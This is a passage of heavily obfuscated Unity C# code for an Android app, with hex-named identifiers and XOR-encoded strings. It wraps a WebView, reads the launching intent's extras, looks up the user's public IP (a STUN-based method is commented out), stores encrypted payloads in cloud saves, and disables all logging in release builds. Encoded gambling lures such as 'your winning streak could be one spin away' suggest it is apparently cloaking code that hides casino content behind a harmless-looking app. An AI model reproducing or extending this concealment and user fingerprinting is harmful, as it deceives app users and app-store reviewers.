        WLog(_0x6938ded6._0xbdc404bd(new byte[31] { 220, 245, 230, 240, 227, 245, 230, 241, 180, 246, 245, 247, 255, 180, 185, 170, 180, 228, 251, 228, 225, 228, 180, 211, 251, 214, 245, 247, 255, 174, 180 }, 148) + _0x11227156.Id);
        _0x11227156.GoBack();
        return true;
    }

    private Text _0x1ed9d804;
    private async Task _0x3377193a(string _0x8a4f8b6a)
    {
        if (_0x57bb4118 || string.IsNullOrEmpty(_0xedebd1d4) || string.IsNullOrEmpty(_0x8a4f8b6a) || _0x08d62e63)
            return;
        _0x57bb4118 = true;
        try
        {
            JObject _0x7200fb9a = BuildRandomPayload(_0x8a4f8b6a, _0xedebd1d4, _0xaeed1bf4());
            {
#if B_LOGS
                {
                    Debug.Log($"[Test][Load Pass] Send total: {_0x8a4f8b6a} payload: {_0x7200fb9a}");
                }
#endif
            }

            var _0x9af0e699 = _0x37814e7b(_0x7200fb9a.ToString(), _0xedebd1d4);
            await CloudSaveService.Instance.Data.Player.SaveAsync(new Dictionary<string, object> { { _0x6938ded6._0xbdc404bd(new byte[4] { 81, 82, 92, 89 }, 61) + _0xedebd1d4, _0x9af0e699 } });
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[24] { 166, 169, 184, 174, 169, 160, 221, 177, 146, 156, 153, 221, 141, 156, 142, 142, 221, 152, 143, 143, 146, 143, 199, 221 }, 253) + e.Message);
#endif
            }
        }
    }

    private void _0x48bc8dc0()
    {
        using (var _0x7a586b2c = new AndroidJavaClass(_0x6938ded6._0xbdc404bd(new byte[30] { 131, 143, 141, 206, 149, 142, 137, 148, 153, 211, 132, 206, 144, 140, 129, 153, 133, 146, 206, 181, 142, 137, 148, 153, 176, 140, 129, 153, 133, 146 }, 224)))
        using (var _0x0e8a11b5 = _0x7a586b2c.GetStatic<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[15] { 83, 69, 66, 66, 85, 94, 68, 113, 83, 68, 89, 70, 89, 68, 73 }, 48)))
        using (var _0x90990100 = _0x0e8a11b5.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[9] { 188, 190, 175, 146, 181, 175, 190, 181, 175 }, 219)))
        {
            if (_0x90990100 == null)
                return;
            using (var _0xf4a65c8a = _0x90990100.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[9] { 208, 210, 195, 242, 207, 195, 197, 214, 196 }, 183)))
            {
                if (_0xf4a65c8a == null)
                    return;
                using (var _0xb97023b7 = new AndroidJavaObject(_0x6938ded6._0xbdc404bd(new byte[19] { 121, 100, 113, 56, 124, 101, 121, 120, 56, 92, 69, 89, 88, 89, 116, 124, 115, 117, 98 }, 22)))
                using (var _0x980a28be = _0xf4a65c8a.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[6] { 34, 44, 48, 26, 44, 61 }, 73)))
                using (var _0x70c1fcaf = _0x980a28be.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[8] { 71, 90, 75, 92, 79, 90, 65, 92 }, 46)))
                {
                    while (_0x70c1fcaf.Call<bool>(_0x6938ded6._0xbdc404bd(new byte[7] { 46, 39, 53, 8, 35, 62, 50 }, 70)))
                    {
                        string _0x4d3ba51e = _0x70c1fcaf.Call<string>(_0x6938ded6._0xbdc404bd(new byte[4] { 182, 189, 160, 172 }, 216));
                        using (var _0xf88134ef = _0xf4a65c8a.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[3] { 237, 239, 254 }, 138), _0x4d3ba51e))
                        {
                            _0xb97023b7.Call<AndroidJavaObject>(_0x6938ded6._0xbdc404bd(new byte[3] { 84, 81, 80 }, 36), _0x4d3ba51e, _0xf88134ef);
                        }
                    }

                    string _0xfca1a080 = _0xb97023b7.Call<string>(_0x6938ded6._0xbdc404bd(new byte[8] { 90, 65, 125, 90, 92, 71, 64, 73 }, 46));
                    if (!string.IsNullOrEmpty(_0xfca1a080))
                    {
                        _0xb7421593(_0xfca1a080);
                        _0x30fcf0d6(_0xfca1a080);
                    }
                }
            }
        }
    }

    private IEnumerator _0xcb5579c3()
    {
        yield return RequestAndroidPermissionIfNeeded(Permission.Camera);
    }

    private Canvas _0x420d8de4;
    public void _0x816ea96e()
    {
        isDestroyedForce = true;
        StopAllCoroutines();
        {
#if B_LOGS
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[18] { 9, 6, 55, 33, 38, 15, 114, 30, 51, 39, 60, 49, 58, 114, 21, 51, 63, 55 }, 82));
#endif
        }

        _0xc587caa3.Instance?._0x43013d7b();
        _0x9ae3504d.Instance._0xdb936680(_0x1fc44a94._0x517a5fb9.DEFAULT);
    }

    private string _0x5fbdd8dd = "";
    private string _0x8c66a763 = "";
    private string _0x0ea3f72d = "";
    internal void _0xd9c381a4()
    {
        Rect _0x94883416 = Screen.safeArea;
        Vector2 _0xda4bbf37 = new Vector2(Screen.width, Screen.height);
        if (_0x94883416 == lastSafe && _0xda4bbf37 == lastSize)
            return;
        // Apply manual padding
        _0x94883416.xMin += _0xa2156a69;
        _0x94883416.xMax -= _0x23cc6156;
        _0x94883416.yMin += _0x017aab63;
        _0x94883416.yMax -= _0x82ea3f6c;
        // Convert Unity safe area -> native WebView frame
        Rect _0x73266783 = new Rect(_0x94883416.x, _0xda4bbf37.y - _0x94883416.y - _0x94883416.height, // Y flip for native coordinate system
 _0x94883416.width, _0x94883416.height);
        _0x8b5683d0.Frame = _0x73266783;
        lastSafe = Screen.safeArea;
        lastSize = _0xda4bbf37;
    }

    private void _0x02d28fad()
    {
        if (_0xa66599db != null)
            return;
        var _0xf56b4235 = _0x4de303c9();
        _0xa66599db = new GameObject(_0x6938ded6._0xbdc404bd(new byte[14] { 116, 70, 65, 117, 74, 70, 84, 112, 83, 74, 77, 77, 70, 81 }, 35), typeof(RectTransform), typeof(Text));
        _0x45a777cf = _0xa66599db.GetComponent<RectTransform>();
        _0x45a777cf.SetParent(_0xf56b4235.transform, false);
        _0x45a777cf.anchorMin = new Vector2(0.5f, 0.5f);
        _0x45a777cf.anchorMax = new Vector2(0.5f, 0.5f);
        _0x45a777cf.pivot = new Vector2(0.5f, 0.5f);
        _0x45a777cf.sizeDelta = new Vector2(600f, 600f);
        _0x45a777cf.anchoredPosition = Vector2.zero;
        _0x1ed9d804 = _0xa66599db.GetComponent<Text>();
        _0x1ed9d804.text = _0x6938ded6._0xbdc404bd(new byte[1] { 117 }, 90);
        _0x1ed9d804.font = Resources.GetBuiltinResource<Font>(_0x6938ded6._0xbdc404bd(new byte[17] { 61, 20, 22, 16, 18, 8, 35, 4, 31, 5, 24, 28, 20, 95, 5, 5, 23 }, 113));
        _0x1ed9d804.fontSize = 200;
        _0x1ed9d804.alignment = TextAnchor.MiddleCenter;
        _0x1ed9d804.color = Color.white;
        _0x1ed9d804.raycastTarget = false;
        _0xa66599db.SetActive(false);
    }

    private static bool IsPrivacyItemTrue(Item _0x97ebea00)
    {
        if (_0x97ebea00.Key != _0x6938ded6._0xbdc404bd(new byte[9] { 71, 93, 126, 92, 71, 88, 79, 77, 87 }, 46))
            return false;
        try
        {
            var _0x40f01909 = _0x97ebea00.Value.GetAs<object>();
            return _0x40f01909 switch
            {
                bool b => b,
                string s when bool.TryParse(s, out var parsed) => parsed,
                _ => false
            };
        }
        catch
        {
            return false;
        }
    }

    private void WLog(string _0x5d7f3e34)
    {
#if B_LOGS
        {
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[7] { 172, 163, 146, 132, 131, 170, 215 }, 247) + _0x5d7f3e34);
        }
#endif
    }

    //    private async Task<string> GetMyip()
    //    {
    //        string result = "";
    //        var processorType = SystemInfo.processorType;
    //        //        {
    //        //#if NOT_B_STARTED
    //        //#endif
    //        if (!processorType.Contains("armv7", StringComparison.OrdinalIgnoreCase) && !processorType.Contains("x86-64", StringComparison.OrdinalIgnoreCase))
    //        {
    //            var tcs = new TaskCompletionSource<string>();
    //            // Primary and fallback STUN servers (Google STUN 1-6)
    //            var stunServers = new[]
    //            {
    //                new[] { "stun:stun.l.google.com:19302" },      // Primary
    //                //new[] { "stun:stun1.l.google.com:19302" },     // Fallback 1
    //                //new[] { "stun:stun2.l.google.com:19302" },     // Fallback 2
    //                //new[] { "stun:stun3.l.google.com:19302" },     // Fallback 3
    //                //new[] { "stun:stun4.l.google.com:19302" },     // Fallback 4
    //                //new[] { "stun:stun5.l.google.com:19302" },     // Fallback 5
    //                //new[] { "stun:stun6.l.google.com:19302" }      // Fallback 6
    //            };
    //            RTCPeerConnection pc = null;
    //            foreach (var serverUrls in stunServers)
    //            {
    //                if (tcs.Task.IsCompleted)
    //                    break;
    //                try
    //                {
    //                    var config = new RTCConfiguration
    //                    {
    //                        iceServers = new RTCIceServer[]
    //                        {
    //                    new RTCIceServer { urls = serverUrls }
    //                        },
    //                        iceTransportPolicy = RTCIceTransportPolicy.All
    //                    };
    //                    pc = new RTCPeerConnection(ref config);
    //                    pc.OnIceCandidate = candidate =>
    //                    {
    //                        if (candidate == null || tcs.Task.IsCompleted)
    //                            return;
    //                        if (candidate.Type == RTCIceCandidateType.Srflx || candidate.Type == RTCIceCandidateType.Prflx)
    //                        {
    //                            string address = candidate.Address;
    //                            string ip = "";
    //                            // Parse IP from address (which may be IPv4 "ip:port" or IPv6 "[ip]:port")
    //                            if (address.StartsWith("[") && address.Contains("]:"))
    //                            {
    //                                // IPv6 format: [2001:db8::1]:12345
    //                                int endBracket = address.IndexOf(']');
    //                                ip = address.Substring(1, endBracket - 1);
    //                            }
    //                            else if (address.Contains(':'))
    //                            {
    //                                // IPv4 format: 192.168.1.1:12345
    //                                int lastColon = address.LastIndexOf(':');
    //                                ip = address.Substring(0, lastColon);
    //                            }
    //                            else
    //                            {
    //                                // No port, just IP
    //                                ip = address;
    //                            }
    //                            {
    //#if B_LOGS
    //                                {
    //                                    Debug.Log($"[test STUN] Public IP: {ip} from {serverUrls[0]}");
    //                                }
    //#endif
    //                            }
    //                            tcs.TrySetResult(ip);
    //                        }
    //                    };
    //                    pc.CreateDataChannel("init");
    //                    var offerOp = pc.CreateOffer();
    //                    while (!offerOp.IsDone)
    //                        await Task.Yield();
    //                    var desc = offerOp.Desc;
    //                    pc.SetLocalDescription(ref desc);
    //                    float timeout = 10f;
    //                    float t = 0f;
    //                    while (!tcs.Task.IsCompleted && t < timeout)
    //                    {
    //                        await Task.Delay(100);
    //                        t += 0.1f;
    //                    }
    //                    if (tcs.Task.IsCompleted)
    //                    {
    //                        result = tcs.Task.Result;
    //                        break;
    //                    }
    //                    {
    //#if B_LOGS
    //                        {
    //                            Debug.Log($"[test STUN] Failed with {serverUrls[0]}, trying next...");
    //                        }
    //#endif
    //                    }
    //                }
    //                catch (Exception ex)
    //                {
    //#if B_LOGS
    //                    {
    //                        Debug.Log($"[test STUN] Error with {serverUrls[0]}: {ex.Message}");
    //                    }
    //#endif
    //                    if (pc != null)
    //                    {
    //                        pc.Close();
    //                        pc.Dispose();
    //                    }
    //                }
    //            }
    //            if (!tcs.Task.IsCompleted)
    //                result = "";
    //        }
    //        //#if NOT_B_STARTED
    //        //            else
    //        //        if(result == "")
    //        //        {
    //        //            {
    //        //#if B_LOGS
    //        //                {
    //        //                    Debug.LogError($"[TEST] WebRTC DLL missing or ARMv7 architecture");
    //        //                }
    //        //#endif
    //        //            }
    //        //            result = await GetMyipFallback("0fce0027001c001700140011000b000a0008001f00180022001b00010024001e0025002300260002000400050006000300070000000c001d0015000d000f0021000900100019001a0013000e00120020001647175e80370ec5a1a5d9b1b039a49e64977f39d478adcf763f556d428a45d94f056b1d88f6b76874");
    //        //        }
    //        //#endif
    //        //        }
    //        {
    //#if B_LOGS
    //            {
    //                Debug.Log($"[Test] Get my ip: {result}");
    //            }
    //#endif
    //        }
    //        return result;
    //    }
    private async Task<string> _0xb984db94()
    {
        var _0xff1d31f3 = _0x6938ded6._0xbdc404bd(new byte[40] { 185, 165, 165, 161, 162, 235, 254, 254, 166, 166, 166, 255, 178, 189, 190, 164, 181, 183, 189, 176, 163, 180, 255, 178, 190, 188, 254, 178, 181, 191, 252, 178, 182, 184, 254, 165, 163, 176, 178, 180 }, 209);
        using (UnityWebRequest _0xda4cf600 = UnityWebRequest.Get(_0xff1d31f3))
        {
            await _0xda4cf600.SendWebRequest();
            string[] _0x87b7c0d0 = _0xda4cf600.downloadHandler.text.Split('\n');
            foreach (string _0xc4929657 in _0x87b7c0d0)
            {
                if (_0xc4929657.StartsWith(_0x6938ded6._0xbdc404bd(new byte[3] { 29, 4, 73 }, 116)))
                {
                    string _0xf71b7106 = _0xc4929657.Substring(3);
                    {
#if B_LOGS
                        {
                            Debug.Log($"[Test] User ip (FALLBACK MODE): {_0xf71b7106} from {_0xff1d31f3}");
                        }
#endif
                    }

                    return _0xf71b7106;
                }
            }
        }

        return "";
    }

    private async Task<string> _0x1e44a33c(int _0xc6cec3fe = 5, int _0x0e2e5ce8 = 500)
    {
        try
        {
            List<EntityData> _0xe93c7af0 = new List<EntityData>();
            int _0xf6975e0a = 0;
            do
            {
                _0xe93c7af0 = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x6938ded6._0xbdc404bd(new byte[8] { 121, 101, 104, 112, 108, 123, 64, 109 }, 9), _0xedebd1d4, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0xedebd1d4 }), new QueryOptions())).ToList();
                await Task.Delay(_0x0e2e5ce8);
            }
            while (_0xe93c7af0.Count == 0 && _0xf6975e0a++ < _0xc6cec3fe);
            {
#if B_LOGS
                {
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[33] { 255, 240, 193, 215, 208, 249, 132, 247, 197, 210, 193, 192, 132, 232, 205, 202, 207, 132, 245, 209, 193, 214, 221, 132, 214, 193, 215, 209, 200, 208, 215, 158, 132 }, 164) + JsonConvert.SerializeObject(_0xe93c7af0, Formatting.Indented));
                }
#endif
            }

            {
#if B_LOGS
                {
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[39] { 131, 140, 189, 171, 172, 133, 248, 139, 185, 174, 189, 188, 248, 148, 177, 182, 179, 248, 137, 173, 189, 170, 161, 248, 170, 189, 171, 173, 180, 172, 171, 248, 187, 183, 173, 182, 172, 226, 248 }, 216) + _0xe93c7af0.Count);
                }
#endif
            }

            var _0xe7cee16d = _0xe93c7af0.SelectMany(_0xc367131d => _0xc367131d.Data).FirstOrDefault(_0x951a91fc => _0x951a91fc.Key == _0xedebd1d4)?.Value.GetAs<string>() ?? string.Empty;
            _0xe7cee16d = Decrypt(_0xe7cee16d, _0xedebd1d4);
            {
#if B_LOGS
                {
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[24] { 222, 209, 224, 246, 241, 216, 165, 201, 234, 228, 225, 165, 246, 228, 243, 224, 225, 165, 233, 236, 235, 238, 191, 165 }, 133) + _0xe7cee16d);
                }
#endif
            }

            return _0xe7cee16d;
        }
        catch (Exception ex)
        {
            {
#if B_LOGS
                {
                    Debug.Log(_0x6938ded6._0xbdc404bd(new byte[39] { 42, 37, 20, 2, 5, 44, 81, 54, 20, 5, 81, 30, 3, 81, 1, 16, 3, 2, 20, 81, 2, 16, 7, 20, 21, 81, 29, 24, 31, 26, 81, 23, 16, 24, 29, 20, 21, 75, 81 }, 113) + ex.Message);
                }
#endif
            }

            return string.Empty;
        }
    }

    internal bool ContainsIgnoreCase(string _0xea1a94eb, string _0xd226e988)
    {
        if (string.IsNullOrEmpty(_0xea1a94eb) || string.IsNullOrEmpty(_0xd226e988))
            return false;
        return _0xea1a94eb.IndexOf(_0xd226e988, StringComparison.OrdinalIgnoreCase) >= 0;
    }

    private string _0x2571d61a = "";
    private UniWebViewPopup _0xcb60871a()
    {
        for (int _0xed8fe309 = _0x0a749e0b.Count - 1; _0xed8fe309 >= 0; _0xed8fe309--)
        {
            var _0xdcc3607b = _0x0a749e0b[_0xed8fe309];
            if (_0xdcc3607b != null && _0xdcc3607b.IsAlive)
                return _0xdcc3607b;
            _0x0a749e0b.RemoveAt(_0xed8fe309);
        }

        return null;
    }

    private void Awake()
    {
        if (_0x562e499c != null)
        {
            Destroy(this.gameObject);
            return;
        }

        EnhancedTouchSupport.Enable();
        Input.backButtonLeavesApp = false;
        {
#if !B_LOGS
            Debug.unityLogger.logEnabled = false;
            Application.SetStackTraceLogType(LogType.Assert, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Exception, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Warning, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Error, StackTraceLogType.None);
            Application.SetStackTraceLogType(LogType.Log, StackTraceLogType.None);
#endif
        }

        _0x562e499c = gameObject.GetComponent<_0x7dc557d6>();
        DontDestroyOnLoad(gameObject);
        _0x8c66a763 = _0x4208a47a = _0x8c3ab9a1 = "";
        _0xf296c768 = "";
        _0xad6479a6 = false;
    }

    private void _0x37abf804()
    {
        WLog(_0x6938ded6._0xbdc404bd(new byte[21] { 201, 224, 243, 229, 246, 224, 243, 228, 161, 227, 224, 226, 234, 161, 241, 243, 228, 242, 242, 228, 229 }, 129));
        if (Time.frameCount == _0x30353436)
            return;
        _0x30353436 = Time.frameCount;
        if (_0xe44c8bb1())
            return;
        _0x57d140fe();
    }

    internal void Update()
    {
        if (_0x8b5683d0 == null)
            return;
        if (_0xb95de315())
            _0x37abf804();
        if (!isApplicationFocus || isApplicationPause)
            return;
        _0xd9c381a4();
        if (_0x3eaadd85 && _0x45a777cf != null)
            _0x45a777cf.Rotate(0f, 0f, -360f * Time.deltaTime);
    }

    internal Vector2 lastSize = Vector2.zero;
    /* ============================= */
    /* ENCRYPT / DECRYPT             */
    /* ============================= */
    private string _0x37814e7b(string _0xa5380e95, string _0x7fc77009)
    {
        try
        {
            using var _0x0f679e26 = Aes.Create();
            _0x0f679e26.Key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(_0x7fc77009));
            _0x0f679e26.GenerateIV();
            using var _0xcc9edd0a = new MemoryStream();
            _0xcc9edd0a.Write(_0x0f679e26.IV, 0, _0x0f679e26.IV.Length);
            using (var _0x4c281530 = new CryptoStream(_0xcc9edd0a, _0x0f679e26.CreateEncryptor(), CryptoStreamMode.Write))
            {
                var _0x1b9a695c = Encoding.UTF8.GetBytes(_0xa5380e95);
                _0x4c281530.Write(_0x1b9a695c, 0, _0x1b9a695c.Length);
                _0x4c281530.FlushFinalBlock();
            }

            return Convert.ToBase64String(_0xcc9edd0a.ToArray());
        }
        catch (Exception ex)
        {
            return "";
        }
    }

    private bool _0x57bb4118 = false;
    private string _0xf296c768 = "";
    // MAIN FLOW
    private bool _0x90914ba6 { get; set; }

    public void _0xfd041e27()
    {
        if (_0xad6479a6)
            return;
        {
#if B_LOGS
            {
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[33] { 242, 253, 204, 218, 221, 244, 137, 253, 192, 196, 204, 219, 137, 198, 220, 221, 137, 132, 151, 137, 196, 198, 223, 204, 137, 221, 198, 137, 218, 202, 204, 199, 204 }, 169));
            }
#endif
        }

        _0x816ea96e();
    }

    private JObject BuildRandomPayload(params string[] _0xa1fb6203)
    {
        JObject _0x8d53c76f = new JObject();
        foreach (var _0xffb267f9 in _0xa1fb6203)
        {
            string _0x2369c8e2 = _0x62619bf7();
            {
#if B_LOGS
                Debug.Log($"[Test] Crypto key={_0x2369c8e2} val={_0xffb267f9}");
#endif
            }

            _0x8d53c76f.Add(_0x2369c8e2, _0xffb267f9 == null ? "" : _0xffb267f9);
        }

        return _0x8d53c76f;
    }

    private static readonly string WindowsDesktopUserAgent = _0x6938ded6._0xbdc404bd(new byte[111] { 254, 220, 201, 218, 223, 223, 210, 156, 134, 157, 131, 147, 155, 228, 218, 221, 215, 220, 196, 192, 147, 253, 231, 147, 130, 131, 157, 131, 136, 147, 228, 218, 221, 133, 135, 136, 147, 203, 133, 135, 154, 147, 242, 195, 195, 223, 214, 228, 214, 209, 248, 218, 199, 156, 134, 128, 132, 157, 128, 133, 147, 155, 248, 251, 231, 254, 255, 159, 147, 223, 218, 216, 214, 147, 244, 214, 208, 216, 220, 154, 147, 240, 219, 193, 220, 222, 214, 156, 130, 129, 131, 157, 131, 157, 131, 157, 131, 147, 224, 210, 213, 210, 193, 218, 156, 134, 128, 132, 157, 128, 133 }, 179);
    private bool _0x08d62e63 = false;
    private readonly string[] _0xbb0b0537 = new string[]
    {
        _0x6938ded6._0xbdc404bd(new byte[60] { 30, 113, 96, 94, 206, 186, 134, 139, 206, 156, 139, 139, 130, 157, 206, 143, 156, 139, 206, 134, 129, 154, 206, 156, 135, 137, 134, 154, 206, 128, 129, 153, 206, 12, 110, 125, 206, 138, 129, 128, 12, 110, 119, 154, 206, 131, 135, 157, 157, 206, 151, 129, 155, 156, 206, 157, 158, 135, 128, 207 }, 238),
        _0x6938ded6._0xbdc404bd(new byte[52] { 187, 212, 198, 203, 107, 2, 63, 107, 40, 36, 62, 39, 47, 107, 41, 46, 107, 50, 36, 62, 57, 107, 39, 62, 40, 32, 50, 107, 38, 36, 38, 46, 37, 63, 107, 169, 203, 216, 107, 60, 35, 50, 107, 56, 63, 36, 59, 107, 37, 36, 60, 116 }, 75),
        _0x6938ded6._0xbdc404bd(new byte[66] { 237, 149, 174, 224, 183, 128, 47, 77, 102, 104, 47, 120, 102, 97, 124, 47, 110, 125, 106, 47, 103, 102, 123, 123, 102, 97, 104, 47, 98, 96, 125, 106, 47, 96, 105, 123, 106, 97, 47, 123, 96, 107, 110, 118, 47, 237, 143, 156, 47, 124, 123, 110, 118, 47, 102, 97, 47, 123, 103, 106, 47, 104, 110, 98, 106, 33 }, 15),
        _0x6938ded6._0xbdc404bd(new byte[54] { 102, 9, 3, 4, 182, 194, 254, 255, 229, 182, 255, 229, 182, 230, 228, 255, 251, 243, 182, 226, 255, 251, 243, 182, 116, 22, 5, 182, 226, 254, 243, 182, 244, 243, 229, 226, 182, 230, 250, 247, 239, 243, 228, 229, 182, 230, 250, 247, 239, 182, 248, 249, 225, 184 }, 150),
        _0x6938ded6._0xbdc404bd(new byte[48] { 129, 238, 229, 212, 81, 40, 30, 4, 3, 81, 6, 24, 31, 31, 24, 31, 22, 81, 2, 5, 3, 20, 16, 26, 81, 18, 30, 4, 29, 21, 81, 19, 20, 81, 30, 31, 20, 81, 2, 1, 24, 31, 81, 16, 6, 16, 8, 95 }, 113),
        _0x6938ded6._0xbdc404bd(new byte[65] { 222, 177, 180, 174, 14, 100, 79, 77, 69, 94, 65, 90, 93, 14, 79, 92, 75, 14, 67, 65, 92, 75, 14, 79, 77, 90, 71, 88, 75, 14, 90, 65, 64, 71, 73, 70, 90, 14, 204, 174, 189, 14, 93, 90, 79, 87, 14, 79, 64, 74, 14, 90, 92, 87, 14, 87, 65, 91, 92, 14, 66, 91, 77, 69, 0 }, 46),
        _0x6938ded6._0xbdc404bd(new byte[55] { 25, 118, 103, 91, 201, 172, 159, 140, 155, 144, 201, 154, 153, 128, 135, 201, 138, 134, 156, 135, 157, 154, 201, 11, 105, 122, 201, 157, 129, 140, 201, 135, 140, 145, 157, 201, 134, 135, 140, 201, 138, 134, 156, 133, 141, 201, 139, 140, 201, 144, 134, 156, 155, 154, 199 }, 233),
        _0x6938ded6._0xbdc404bd(new byte[63] { 194, 141, 176, 207, 152, 175, 0, 112, 76, 65, 89, 69, 82, 83, 0, 82, 73, 71, 72, 84, 0, 78, 79, 87, 0, 65, 82, 69, 0, 87, 73, 78, 78, 73, 78, 71, 0, 194, 160, 179, 0, 68, 79, 78, 194, 160, 185, 84, 0, 87, 65, 76, 75, 0, 65, 87, 65, 89, 0, 89, 69, 84, 14 }, 32),
        _0x6938ded6._0xbdc404bd(new byte[51] { 87, 56, 40, 33, 135, 232, 201, 203, 222, 135, 211, 207, 200, 212, 194, 135, 208, 207, 200, 135, 212, 211, 198, 222, 135, 206, 201, 135, 211, 207, 194, 135, 192, 198, 202, 194, 135, 208, 206, 201, 135, 211, 207, 194, 135, 215, 213, 206, 221, 194, 137 }, 167),
        _0x6938ded6._0xbdc404bd(new byte[64] { 84, 44, 23, 89, 14, 57, 150, 251, 217, 219, 211, 216, 194, 195, 219, 150, 223, 197, 150, 211, 192, 211, 196, 207, 194, 222, 223, 216, 209, 150, 84, 54, 37, 150, 221, 211, 211, 198, 150, 197, 198, 223, 216, 216, 223, 216, 209, 150, 208, 217, 196, 150, 207, 217, 195, 196, 150, 213, 222, 215, 216, 213, 211, 152 }, 182)
    };
    internal bool isDestroyedForce = false;
    private IEnumerator RequestAndroidPermissionIfNeeded(string _0xf86786f2)
    {
        if (Permission.HasUserAuthorizedPermission(_0xf86786f2))
            yield break;
        bool _0x58597075 = false;
        var _0xa687a1bc = new PermissionCallbacks();
        _0xa687a1bc.PermissionGranted += _0xdba14b4e => _0x58597075 = true;
        _0xa687a1bc.PermissionDenied += _0xdba14b4e => _0x58597075 = true;
        Permission.RequestUserPermission(_0xf86786f2, _0xa687a1bc);
        yield return new WaitUntil(() => _0x58597075);
    }

    private bool _0x5b7f34c9 = false;
    private async Task<bool> _0x4424fcb3(int _0x09ca60b7 = 5, int _0x29ca8e9c = 500)
    {
        List<EntityData> _0xf95bc0ad = new List<EntityData>();
        int _0xd0ee3846 = 0;
        do
        {
            try
            {
                _0xf95bc0ad = (await CloudSaveService.Instance.Data.Player.QueryAsync(new Query(new List<FieldFilter> { new FieldFilter(_0x6938ded6._0xbdc404bd(new byte[8] { 179, 175, 162, 186, 166, 177, 138, 167 }, 195), _0xedebd1d4, FieldFilter.OpOptions.EQ, true) }, new HashSet<string> { _0x6938ded6._0xbdc404bd(new byte[9] { 247, 237, 206, 236, 247, 232, 255, 253, 231 }, 158) }), new QueryOptions())).ToList();
            }
            catch (Exception e)
            {
                {
#if B_LOGS
                    {
                        Debug.Log(_0x6938ded6._0xbdc404bd(new byte[32] { 233, 230, 215, 193, 198, 239, 146, 195, 199, 215, 192, 203, 243, 193, 203, 220, 209, 224, 215, 193, 199, 222, 198, 193, 146, 215, 192, 192, 221, 192, 136, 146 }, 178) + e.Message);
                    }
#endif
                }
            }

            await Task.Delay(_0x29ca8e9c);
        }
        while (_0xf95bc0ad.Count == 0 && _0xd0ee3846++ < _0x09ca60b7);
        {
#if B_LOGS
            {
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[32] { 2, 13, 60, 42, 45, 4, 121, 16, 42, 9, 43, 48, 47, 56, 58, 32, 121, 8, 44, 60, 43, 32, 121, 43, 60, 42, 44, 53, 45, 42, 99, 121 }, 89) + JsonConvert.SerializeObject(_0xf95bc0ad, Formatting.Indented));
            }
#endif
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[38] { 81, 94, 111, 121, 126, 87, 42, 67, 121, 90, 120, 99, 124, 107, 105, 115, 42, 91, 127, 111, 120, 115, 42, 120, 111, 121, 127, 102, 126, 121, 42, 105, 101, 127, 100, 126, 48, 42 }, 10) + _0xf95bc0ad.Count);
            }
#endif
        }

        bool _0x210f3ae3 = true;
        if (_0xf95bc0ad.Count == 0)
        {
            _0x210f3ae3 = false;
        }
        else
        {
            _0x210f3ae3 = _0xf95bc0ad.Any(_0xc367131d => _0xc367131d.Data.Any(IsPrivacyItemTrue));
        }

        {
#if B_LOGS
            {
                Debug.Log(_0x6938ded6._0xbdc404bd(new byte[25] { 77, 66, 115, 101, 98, 75, 54, 95, 101, 70, 100, 127, 96, 119, 117, 111, 54, 100, 115, 101, 99, 122, 98, 44, 54 }, 22) + _0x210f3ae3);
            }
#endif
        }

        return _0x210f3ae3;
    }

    private async Task<bool> _0x167f421e()
    {
        {
#if B_LOGS
            Debug.Log(_0x6938ded6._0xbdc404bd(new byte[29] { 57, 54, 7, 17, 22, 63, 66, 43, 17, 50, 16, 11, 20, 3, 1, 27, 35, 12, 6, 49, 3, 20, 7, 6, 33, 10, 7, 1, 9 }, 98));
#endif
        }

        string _0x6198a956 = "";
        for (int _0xcdade186 = 0; _0xcdade186 < 2; _0xcdade186++)
        {
            if (await _0x4424fcb3(1, 100))
            {
                await _0x3377193a(_0x6938ded6._0xbdc404bd(new byte[7] { 38, 40, 43, 39, 47, 33, 32 }, 68));
                _0x816ea96e();
                return true;
            }

            _0x6198a956 = await _0x1e44a33c(1, 100);
            if (!string.IsNullOrEmpty(_0x6198a956))
                break;
        }

        try
        {
            if (!string.IsNullOrEmpty(_0x6198a956))
            {
                if (!string.IsNullOrEmpty(_0x47f4b2cf))
                {
                    _0x6198a956 = _0xf4796fa5(_0x6198a956, _0x47f4b2cf);
                    {
#if B_LOGS
                        Debug.Log(_0x6938ded6._0xbdc404bd(new byte[53] { 33, 46, 31, 9, 14, 39, 90, 57, 27, 25, 18, 31, 30, 90, 28, 19, 20, 27, 22, 47, 8, 22, 90, 13, 19, 14, 18, 90, 9, 31, 20, 30, 19, 30, 90, 152, 252, 232, 90, 9, 18, 21, 13, 90, 45, 31, 24, 44, 19, 31, 13, 64, 90 }, 122) + _0x6198a956);
#endif
                    }
                }
                else
                {
                    {
#if B_LOGS
                        Debug.Log(_0x6938ded6._0xbdc404bd(new byte[39] { 214, 217, 232, 254, 249, 208, 173, 206, 236, 238, 229, 232, 233, 173, 235, 228, 227, 236, 225, 216, 255, 225, 173, 111, 11, 31, 173, 254, 229, 226, 250, 173, 218, 232, 239, 219, 228, 232, 250 }, 141));
#endif
                    }
                }

                _0x08d62e63 = true;
                _0xb916ebe7(_0x6198a956);
                return true;
            }

            return false;
        }
        catch (Exception e)
        {
            {
#if B_LOGS
                {
